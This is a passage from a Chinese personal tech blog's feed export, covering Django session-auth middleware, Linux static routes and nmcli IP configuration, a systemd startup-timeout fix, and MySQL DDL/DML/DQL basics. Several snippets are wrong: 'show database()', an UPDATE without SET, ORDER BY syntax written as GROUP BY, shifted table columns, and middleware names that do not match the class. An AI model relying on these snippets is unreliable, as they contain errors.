<h3><span id="鉴权操作只有认证成功才可以访问其他页面">鉴权操作(只有认证成功，才可以访问其他页面)</span></h3><p>朴素的实现方式：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">admin_list</span>(<span class="params">request</span>):</span><br><span class="line">	<span class="comment"># 如果没有session，跳转到登录页面</span></span><br><span class="line">    info = request.session.get(<span class="string">&quot;info&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> info:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    admins = models.Admin.objects.<span class="built_in">all</span>()</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&quot;admin_list.html&quot;</span>, &#123;<span class="string">&quot;admins&quot;</span>: admins&#125;)</span><br></pre></td></tr></table></figure>

<p>问题：所有视图都需要session认证，上面的实现太麻烦！</p>
<p>用Django中间件实现鉴权<br>app01&#x2F;middleware&#x2F;auth.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.utils.deprecation <span class="keyword">import</span> MiddlewareMixin</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> HttpResponse, redirect</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AuthMiddleWare</span>(<span class="title class_ inherited__">MiddlewareMixin</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_request</span>(<span class="params">self, request</span>):</span><br><span class="line">        <span class="comment"># 注意：对于无需登录就应该访问的页面，不要做鉴权，否则会循环重定向</span></span><br><span class="line">        <span class="keyword">if</span> request.path_info == <span class="string">&quot;/login/&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        info_dict = request.session.get(<span class="string">&quot;info&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(info_dict)</span><br><span class="line">        <span class="keyword">if</span> info_dict:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login/&quot;</span>)</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_response</span>(<span class="params">self,request, response</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;M1 gone&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>
<p>settings.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">MIDDLEWARE = [</span><br><span class="line">	<span class="string">&#x27;app01.middleware.auth.M1&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;app01.middleware.auth.M2&#x27;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Django</category>
      </categories>
      <tags>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>Rocky Linux 9中添加或删除某个网卡的静态路由</title>
    <url>/2024/0919213729.html</url>
    <content><![CDATA[<h2><span id="使用ip命令配置临时路由">使用ip命令配置临时路由</span></h2><p>添加静态路由</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip route add &lt;目的网络&gt; via &lt;下一跳IP&gt; dev &lt;网卡接口名称&gt;</span><br></pre></td></tr></table></figure>
<p>例: 给eth0网卡添加一个到达 192.168.2.0&#x2F;24 网络，下一跳为 192.168.1.254 的路由</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip route add 192.168.2.0/24 via 192.168.1.254 dev eth0</span><br></pre></td></tr></table></figure>
<p>删除静态路由</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip route del &lt;目的网络&gt; via &lt;下一跳IP&gt; dev &lt;网卡接口名称&gt;</span><br></pre></td></tr></table></figure>
<p>例: 删除上述的静态路由</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip route del 192.168.2.0/24 via 192.168.1.254 dev eth0</span><br></pre></td></tr></table></figure>

<h2><span id="使用nmcli配置永久路由">使用nmcli配置永久路由</span></h2><p>添加静态路由<br>例: 给eth0网卡添加一个到达 192.168.2.0&#x2F;24 网络，下一跳为 192.168.1.254 的路由</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmcli connection modify eth0 +ipv4.routes &quot;192.168.2.0/24 192.168.1.254&quot;</span><br></pre></td></tr></table></figure>
<p>如果需要添加多个路由，可以用逗号分隔的方式添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmcli connection modify eth0 +ipv4.routes &quot;192.168.2.0/24 192.168.1.254,192.168.3.0/24 192.168.1.254&quot;</span><br></pre></td></tr></table></figure>
<p>删除静态路由</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmcli connection modify eth0 -ipv4.routes &quot;192.168.2.0/24 192.168.1.254&quot;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2><span id="参考">参考</span></h2><p><a href="https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/configuring-static-routes_configuring-and-managing-networking#proc_configuring-a-static-route-by-using-nmtui_configuring-static-routes">Red Hat Documentation —— Chapter 24. Configuring a static route</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>使用nmcli配置某个网卡的static IP,Gateway,DNS的方法</title>
    <url>/2024/0925193901.html</url>
    <content><![CDATA[<p>先查看当前网卡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmcli con show</span><br><span class="line">NAME	UUID	TYPE 		DEVICE</span><br><span class="line">eth0	XX	ethernet 	eth0</span><br><span class="line">lo	XX	loopback	lo</span><br></pre></td></tr></table></figure>

<p>例如，配置eth0网卡的static ip为10.206.216.93, gateway 10.206.216.254, DNS 10.204.16.18</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmcli con del eth0</span><br><span class="line">nmcli con add con-name eth0 autoconnect yes type ethernet ifname eth0 ip4 10.206.216.93/24 gw4 10.206.216.254 ipv4.dns &quot;8.8.8.8 4.4.4.4&quot;</span><br><span class="line">nmcli con up eth0</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Systemd服务启动报错: Start operation timed out(执行systemctl start后卡住)的解决方法</title>
    <url>/2024/0925194148.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>在RHEL中运行了一个自定义的systemd服务，启动报错<code> Start operation timed out</code>, 在后台执行systemctl start也被阻塞, 不能自动退出。</p>
<p>service配置文件如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/path/to/monitor_network.sh</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<h2><span id="解决方法">解决方法</span></h2><p>查阅资料，发现Type&#x3D;forking有问题，这里应该改成Type&#x3D;simple。</p>
<span id="more"></span>

<ul>
<li>Type&#x3D;forking时，systemd会认为&#x2F;path&#x2F;to&#x2F;monitor_network.sh是一个守护进程，systemd会等到这个守护进程(父进程)调用fork生成子进程，父进程退出后，systemd才退出。但是我这里的进程是一个不会退出的前台进程，并不是守护进程，所以systemd一直处于等待状态，报<code>Start operation timed out</code>。 </li>
<li>这个问题还有一个错误现象： 你在后台执行systemctl start会被阻塞，尽管后台可以查到进程运行; 通过systemctl status可以查到服务的状态是start，而不是running。</li>
</ul>
<p>关于Systemd Type的详细介绍请移步：<a href="https://www.jinbuguo.com/systemd/systemd.service.html">Systemd中文手册</a></p>
<h2><span id="参考">参考</span></h2><p><a href="https://stackoverflow.com/questions/45012415/systemd-start-operation-timed-out-terminating">https://stackoverflow.com/questions/45012415/systemd-start-operation-timed-out-terminating</a><br><a href="https://www.cnblogs.com/niway/p/15346572.html">https://www.cnblogs.com/niway/p/15346572.html</a></p>
]]></content>
      <categories>
        <category>systemd</category>
      </categories>
      <tags>
        <tag>systemd</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL基础</title>
    <url>/2024/1003155441.html</url>
    <content><![CDATA[<h2><span id="数据库相关概念">数据库相关概念</span></h2><ul>
<li>数据库(DataBase) 存储数据仓库</li>
<li>数据库管理系统(DateBase Management System)(DBMS) 操纵和管理数据库的大型软件</li>
<li>SQL(Structured Query Language)(SQL) 操作关系型数据库的编程语言，定义了一套操作关系数据库的统一标准</li>
</ul>
<h2><span id="关系模型">关系模型</span></h2><p>关系模型本质上就是若干个存储数据的二维表</p>
<ul>
<li>表的每一行称为记录（Record），记录是一个逻辑意义上的数据。</li>
<li>表的每一列称为字段（Column），同一个表的每一行记录都拥有相同的若干字段。</li>
<li>字段定义了数据类型（整型、浮点型、字符串、日期等），以及是否允许为NULL</li>
</ul>
<span id="more"></span>

<h2><span id="什么是sql">什么是SQL</span></h2><p>SQL(Structured Query Language)是结构化查询语言，用来访问和操作数据库系统。定义了几种操作数据库的能力：</p>
<ul>
<li>DDL：Data Definition Language 允许用户定义数据，也就是创建表、删除表、修改表结构这些操作。</li>
<li>DML：Data Manipulation Language 为用户提供添加、删除、更新数据的能力</li>
<li>DQL：Data Query Language 允许用户查询数据，这也是最频繁的数据库日常操作。</li>
</ul>
<h2><span id="ddl-数据库操作">DDL-数据库操作</span></h2><h3><span id="查询所有数据库">查询所有数据库</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>
<h3><span id="查询当前数据库">查询当前数据库</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show database();</span><br></pre></td></tr></table></figure>
<h3><span id="创建表">创建表</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database [if not exists] 数据库名 [default charset 字符集] [COLLATE 排序规则];</span><br></pre></td></tr></table></figure>
<h3><span id="删除数据库">删除数据库</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop database [if exists] 数据库名;</span><br></pre></td></tr></table></figure>
<h3><span id="使用数据库">使用数据库</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 数据库名;</span><br></pre></td></tr></table></figure>

<h2><span id="ddl-表操作-创建amp查询">DDL-表操作-创建&amp;查询</span></h2><h3><span id="查询当前数据库所有表">查询当前数据库所有表</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure>
<h3><span id="查询表结构">查询表结构</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">desc 表名;</span><br></pre></td></tr></table></figure>
<h3><span id="查询指定表的建表语句">查询指定表的建表语句</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show create table 表名;</span><br></pre></td></tr></table></figure>
<h3><span id="创建表">创建表</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table 表名 &#123;</span><br><span class="line">	字段1 字段1类型[COMMENT 字段1注释],</span><br><span class="line">	字段2 字段2类型[COMMENT 字段2注释],</span><br><span class="line">	...</span><br><span class="line">	字段N 字段N类型[COMMENT 字段2注释],</span><br><span class="line">&#125;[COMMENT 表注释];</span><br></pre></td></tr></table></figure>
<p>例: 创建一个学生表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table student ( </span><br><span class="line">	id bigint primary key not null auto_increment, </span><br><span class="line">	name varchar(32), </span><br><span class="line">	class_id bigint</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h2><span id="ddl-数据类型">DDL-数据类型</span></h2><p>参考<a href="https://dev.mysql.com/doc/refman/8.0/en/data-types.html">官方手册</a></p>
<p>MySQL数据类型分三类</p>
<ul>
<li>数值类型</li>
<li>字符串类型</li>
<li>日期时间类型</li>
</ul>
<h3><span id="数值类型">数值类型</span></h3><table>
<thead>
<tr>
<th>分类</th>
<th>类型</th>
<th>大小</th>
<th>有符号范围</th>
<th>无符号范围</th>
</tr>
</thead>
<tbody><tr>
<td>TINYINT</td>
<td>1 byte</td>
<td>(-128,127)</td>
<td>(0,255)</td>
<td>小整数值</td>
</tr>
<tr>
<td>SMALLINT</td>
<td>2 bytes</td>
<td>(-32768,32767)</td>
<td>(0,65535)</td>
<td>大整数值</td>
</tr>
<tr>
<td>MEDIUMINT</td>
<td>3 bytes</td>
<td>(-2^23, 2&amp;23-1)</td>
<td>(0, 2^24-1)</td>
<td>大整数值</td>
</tr>
<tr>
<td>INT或INTEGER</td>
<td>4 bytes</td>
<td>(-2^31, 2^31-1)</td>
<td>(0, 2^32-1)</td>
<td>大整数值</td>
</tr>
<tr>
<td>BIGINT</td>
<td>8 bytes</td>
<td>(-2^63, 2^63-1)</td>
<td>(0, 2^64-1)</td>
<td>极大整数值</td>
</tr>
<tr>
<td>FLOAT</td>
<td>4 bytes</td>
<td></td>
<td></td>
<td>单精度浮点整数值</td>
</tr>
<tr>
<td>DOUBLE</td>
<td>8 bytes</td>
<td></td>
<td></td>
<td>双精度浮点整数值</td>
</tr>
<tr>
<td>DECIMAL</td>
<td></td>
<td>依赖于M和D的值</td>
<td>依赖于M和D的值</td>
<td>小整数值(精确定点数)</td>
</tr>
</tbody></table>
<h3><span id="字符串类型">字符串类型</span></h3><table>
<thead>
<tr>
<th>类型</th>
<th>大小</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>CHAR</td>
<td>0-255 bytes</td>
<td>定长字符串</td>
</tr>
<tr>
<td>VARCHAR</td>
<td>0-65535 bytes</td>
<td>变长字符串</td>
</tr>
<tr>
<td>TINYBLOB</td>
<td>0-255 bytes</td>
<td>二进制数据</td>
</tr>
<tr>
<td>TINTTEXT</td>
<td>0-255 bytes</td>
<td>短文本字符串</td>
</tr>
<tr>
<td>BLOB</td>
<td>0-65535 bytes</td>
<td>二进制形式的文本数据</td>
</tr>
<tr>
<td>TEXT</td>
<td>0-65535 bytes</td>
<td>长文本数据</td>
</tr>
<tr>
<td>MEDIUMBLOB</td>
<td>0-2^24-1</td>
<td>二进制形式的中等长度文本数据</td>
</tr>
<tr>
<td>MEDIUMTEXT</td>
<td>0-2^24-1</td>
<td>中等长度的文本数据</td>
</tr>
<tr>
<td>LONGBLOB</td>
<td>0-2^32-1</td>
<td>二进制形式的极大文本数据</td>
</tr>
<tr>
<td>LONGTEXT</td>
<td>0-2^32-1 bytes</td>
<td>极大的文本数据</td>
</tr>
</tbody></table>
<h3><span id="日期类型">日期类型</span></h3><table>
<thead>
<tr>
<th>类型</th>
<th>大小</th>
<th>范围</th>
<th>格式</th>
</tr>
</thead>
<tbody><tr>
<td>DATE</td>
<td>3</td>
<td>1000-01-01 至 9999-12-31</td>
<td>YYYY-MM-DD</td>
</tr>
<tr>
<td>TIME</td>
<td>3</td>
<td>-838:59:59 至 838:59:59</td>
<td>HH:MM:SS</td>
</tr>
<tr>
<td>YEAR</td>
<td>1</td>
<td>1901 至 2155</td>
<td>YYYY</td>
</tr>
<tr>
<td>DATETIME</td>
<td>8</td>
<td>1000-01-01 00:00:00 至 9999-12-31 23:59:59</td>
<td>YYYY-MM-DD HH:MM:SS</td>
</tr>
<tr>
<td>TIMESTAMP</td>
<td>4</td>
<td>1970-01-01 00:00:01 至 2038-01-19 03:14:07</td>
<td>YYYY-MM-DD HH:MM:SS</td>
</tr>
</tbody></table>
<h3><span id="处理null">处理NULL</span></h3><p>使用IS NULL和IS NOT NULL，不要用&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT 1 IS NULL, 1 IS NOT NULL;</span><br><span class="line">+-----------+---------------+</span><br><span class="line">| 1 IS NULL | 1 IS NOT NULL |</span><br><span class="line">+-----------+---------------+</span><br><span class="line">|         0 |             1 |</span><br><span class="line">+-----------+---------------+</span><br></pre></td></tr></table></figure>
<p>和NULL做算术比较的结果仍然是NULL</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT 1 = NULL, 1 &lt;&gt; NULL, 1 &lt; NULL, 1 &gt; NULL;</span><br><span class="line">+----------+-----------+----------+----------+</span><br><span class="line">| 1 = NULL | 1 &lt;&gt; NULL | 1 &lt; NULL | 1 &gt; NULL |</span><br><span class="line">+----------+-----------+----------+----------+</span><br><span class="line">|     NULL |      NULL |     NULL |     NULL |</span><br><span class="line">+----------+-----------+----------+----------+</span><br><span class="line">mysql&gt; SELECT 0 IS NULL, 0 IS NOT NULL, &#x27;&#x27; IS NULL, &#x27;&#x27; IS NOT NULL;</span><br><span class="line">+-----------+---------------+------------+----------------+</span><br><span class="line">| 0 IS NULL | 0 IS NOT NULL | &#x27;&#x27; IS NULL | &#x27;&#x27; IS NOT NULL |</span><br><span class="line">+-----------+---------------+------------+----------------+</span><br><span class="line">|         0 |             1 |          0 |              1 |</span><br><span class="line">+-----------+---------------+------------+----------------+</span><br></pre></td></tr></table></figure>
<p>In MySQL, 0 or NULL means false and anything else means true. The default truth value from a boolean operation is 1.</p>
<h2><span id="ddl-表操作-修改">DDL-表操作-修改</span></h2><h3><span id="添加字段">添加字段</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table 表名 add 字段名 类型(长度) [COMMENT 注释] [约束];</span><br></pre></td></tr></table></figure>
<p>例: 给emp表添加字段nickname</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table emp add nickname varchar(20);</span><br></pre></td></tr></table></figure>
<h3><span id="修改数据类型">修改数据类型</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table 表名 modify 字段名 新数据类型(长度);</span><br></pre></td></tr></table></figure>
<h3><span id="修改字段名和字段类型">修改字段名和字段类型</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table 表名 change 旧字段名 新字段名 类型(长度) [COMMENT 注释] [约束];</span><br></pre></td></tr></table></figure>
<p>例：把emp表的nickname字段改成username, 类型varchar(24)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table emp change nickname username varchar(24);</span><br></pre></td></tr></table></figure>
<h3><span id="删除字段">删除字段</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table 表名 drop 字段名;</span><br></pre></td></tr></table></figure>
<p>例：将emp表的username字段删除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table emp drop username;</span><br></pre></td></tr></table></figure>
<h3><span id="修改表名">修改表名</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table 表名 rename to 新表名;</span><br></pre></td></tr></table></figure>
<p>例: 将emp表名修改为employee</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table emp rename to employee;</span><br></pre></td></tr></table></figure>
<h3><span id="删除表">删除表</span></h3><p>删除表(包括表结构和内容)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE[IF EXISTS] 表名</span><br></pre></td></tr></table></figure>
<p>删除表，并重新创建该表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">truncate table 表名;</span><br></pre></td></tr></table></figure>

<h2><span id="dml-添加数据">DML-添加数据</span></h2><p>DML全称(Data Manipulation Language), 用于对数据库中表的数据记录进行增、删、改操作</p>
<h3><span id="给指定字段添加数据">给指定字段添加数据</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into 表名(字段1,字段2) values(值1,值2);</span><br></pre></td></tr></table></figure>
<h3><span id="给全部字段添加数据">给全部字段添加数据</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into 表名 values(值1,值2);</span><br></pre></td></tr></table></figure>
<h3><span id="批量添加多条数据">批量添加多条数据</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into 表名 values(值1,值2),(值1,值2);</span><br></pre></td></tr></table></figure>
<p>注：</p>
<ul>
<li>插入数据时，指定字段数据需要和值顺序一一对应</li>
<li>字符串和日期类型应包含在引号中</li>
<li>插入数据大小应该在字段的指定范围内</li>
</ul>
<p>例：插入2条员工数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into employee values(1,&#x27;001&#x27;,&#x27;peter&#x27;,&#x27;M&#x27;,18,&#x27;123456789987654321&#x27;, &#x27;2024-10-14&#x27;),(2,&#x27;002&#x27;,&#x27;jack&#x27;,&#x27;M&#x27;,18,&#x27;123456789987654321&#x27;, &#x27;2024-10-14&#x27;);</span><br></pre></td></tr></table></figure>

<h2><span id="dml-修改数据">DML-修改数据</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update 表名 set 字段1=值1, 字段2=值2 [where 条件];</span><br></pre></td></tr></table></figure>
<p>例: 将id为1数据的name修改为lance，性别修改为F</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update employee set name=&#x27;lance&#x27;, gender=&#x27;F&#x27; where id=1;</span><br></pre></td></tr></table></figure>
<p>例: 所有员工入职日期修改为2005-01-01</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update employee entrydate = &#x27;2005-01-01&#x27;;</span><br></pre></td></tr></table></figure>

<h2><span id="dml-删除数据">DML-删除数据</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from 表名 [where 条件]</span><br></pre></td></tr></table></figure>
<p>例: 删除女性员工</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from employee where gender=&#x27;F&#x27;;</span><br></pre></td></tr></table></figure>
<p>例: 删除所有员工</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from employee;</span><br></pre></td></tr></table></figure>

<h2><span id="dql-查询">DQL-查询</span></h2><p>语法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">	字段</span><br><span class="line"><span class="keyword">from</span> </span><br><span class="line">	表名</span><br><span class="line"><span class="keyword">where</span> </span><br><span class="line">	条件</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line">	分组字段</span><br><span class="line"><span class="keyword">having</span></span><br><span class="line">	分组后条件</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line">	排序字段</span><br><span class="line">limit</span><br><span class="line">	分页参数</span><br></pre></td></tr></table></figure>

<h3><span id="查询多个字段">查询多个字段</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段1,字段2 from 表名;</span><br><span class="line">select * from 表名;</span><br><span class="line">select 字段1 [AS 别名1], 字段2 [AS 别名2] from 表名;</span><br></pre></td></tr></table></figure>
<p>其中AS可以省略</p>
<h3><span id="去除重复">去除重复</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select distinct 字段1 from 表名;</span><br></pre></td></tr></table></figure>

<h2><span id="dql-条件查询">DQL-条件查询</span></h2><p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段列表 from 表名 where 条件列表;</span><br></pre></td></tr></table></figure>
<p>条件</p>
<ul>
<li>比较运算符 &gt;, &gt;&#x3D;, &lt;, &lt;&#x3D; , &#x3D;, &lt;&gt;或!&#x3D;, BETWEEN…AND…, IN(…), LIKE, IS NULL</li>
<li>逻辑运算符 AND或&amp;&amp;, OR或||, NOT或！</li>
</ul>
<p>例：查询年龄在15-20岁员工</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where age between 15 and 20;</span><br><span class="line">select * from emp where age &gt;= 15 and age &lt;= 20;</span><br><span class="line">select * from emp where age in (15,16,17,18,19,20);</span><br></pre></td></tr></table></figure>
<p>例: 查询姓名为两个字符员工</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where name like &#x27;__&#x27;;</span><br></pre></td></tr></table></figure>
<p>例: 查询身份证最后一位为X员工</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where idcard like &#x27;%X&#x27;;</span><br></pre></td></tr></table></figure>

<h2><span id="dql-聚合函数">DQL-聚合函数</span></h2><p>常见聚合函数</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>count</td>
<td>计数</td>
</tr>
<tr>
<td>max</td>
<td>求最大值</td>
</tr>
<tr>
<td>min</td>
<td>求最小值</td>
</tr>
<tr>
<td>avg</td>
<td>求平均数</td>
</tr>
<tr>
<td>sum</td>
<td>求和</td>
</tr>
</tbody></table>
<p>注: NULL值不参与聚合函数运算</p>
<p>例：求员工数, 员工平均年龄, 最大年龄，最小年龄，年龄之和</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*), avg(age),max(age),min(age),sum(age) from emp;</span><br></pre></td></tr></table></figure>

<h2><span id="dql-分组查询">DQL-分组查询</span></h2><p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段列表 from 表名 [where 条件] group by 分组字段名 [having 分组后过滤条件];</span><br></pre></td></tr></table></figure>
<p>注：</p>
<ul>
<li>where是分组前过滤，不满足where条件不参与分组；having是分组后对结果过滤</li>
<li>where不能对聚合函数判断，having可以</li>
<li>分组后，查询字段一般为分组字段和聚合函数，查询其他字段无意义</li>
</ul>
<p>例：查询男性员工和女性员工个数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select gender, count(*) from emp group by gender;</span><br></pre></td></tr></table></figure>

<h2><span id="dql-排序查询">DQL-排序查询</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段 from 表名 group by 字段1 排序方式1, 字段2 排序方式2;</span><br></pre></td></tr></table></figure>
<p>排序方式:</p>
<ul>
<li>ASC 升序(默认值，可以不写)</li>
<li>DESC 降序</li>
</ul>
<p>例：根据年龄对员工升序排序，如年龄相同按入职时间降序排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp order by age, entrydate desc;</span><br></pre></td></tr></table></figure>

<h2><span id="dql-分页查询">DQL-分页查询</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段 from 表名 limit 起始索引,查询记录数;</span><br></pre></td></tr></table></figure>
<p>注：</p>
<ul>
<li>起始索引从0开始, &#x3D;（查询页码-1)*每页显示记录数</li>
<li>每个数据库对分页查询实现不同，MySQL中是limit</li>
<li>如果查询的是第一页数据，索引可以省略，直接写limit XXX</li>
</ul>
<p>例：查询第1页员工数据，，每页10条记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp limit 10;</span><br></pre></td></tr></table></figure>
<p>例：查询第3页员工数据，每页10条记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp limit 20,10;</span><br><span class="line">select * from emp limit 10 offset 20;</span><br></pre></td></tr></table></figure>

<h2><span id="sql-dcl-用户管理x2f权限控制">SQL-DCL-用户管理&#x2F;权限控制</span></h2><!-- TODO -->

<h2><span id="常用函数">常用函数</span></h2><h3><span id="字符串函数">字符串函数</span></h3><table>
<thead>
<tr>
<th>函数</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>CONCAT(s1,s2,…sn)</td>
<td>拼接</td>
</tr>
<tr>
<td>LOWER(str)</td>
<td>全部字符转小写</td>
</tr>
<tr>
<td>UPPER(str)</td>
<td>全部字符转大写</td>
</tr>
<tr>
<td>LPAD(str,n,pad)</td>
<td>左填充，用字符串pad对str左侧填充，直到字符串长度为n</td>
</tr>
<tr>
<td>RPAD(str,n,pad)</td>
<td>右填充，用字符串pad对str右侧填充，直到字符串长度为n</td>
</tr>
<tr>
<td>TRIM(str)</td>
<td>去除头尾空格</td>
</tr>
<tr>
<td>SUBSTRING(str,start,len)</td>
<td>返回从字符串str的start位置起len个长度字符串 (首字符位置为1，不是0)</td>
</tr>
</tbody></table>
<p>例: 员工工位不足5位，低位补0到5位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update emp set workno = LPAD(workno, 5, &#x27;0&#x27;) where workno = &#x27;001&#x27;;</span><br></pre></td></tr></table></figure>

<h3><span id="数值函数">数值函数</span></h3><table>
<thead>
<tr>
<th>函数</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>CEIL(x)</td>
<td>向上取整</td>
</tr>
<tr>
<td>FLOOR(x)</td>
<td>向下取整</td>
</tr>
<tr>
<td>MOD(x,y)</td>
<td>返回x&#x2F;y的模</td>
</tr>
<tr>
<td>RAND()</td>
<td>返回0-1随机数</td>
</tr>
<tr>
<td>ROUND(x,y)</td>
<td>求参数x的四舍五入值，保留y位小数</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select ceil(1.1),floor(1.2),mod(7,4),rand(),ROUND(0.123,2);</span><br><span class="line">+-----------+------------+----------+---------------------+----------------+</span><br><span class="line">| ceil(1.1) | floor(1.2) | mod(7,4) | rand()              | ROUND(0.123,2) |</span><br><span class="line">+-----------+------------+----------+---------------------+----------------+</span><br><span class="line">|         2 |          1 |        3 | 0.19162892474944604 |           0.12 |</span><br><span class="line">+-----------+------------+----------+---------------------+----------------+</span><br></pre></td></tr></table></figure>

<p>例: 通过数据库函数，生成一个六位数的随机验证码</p>
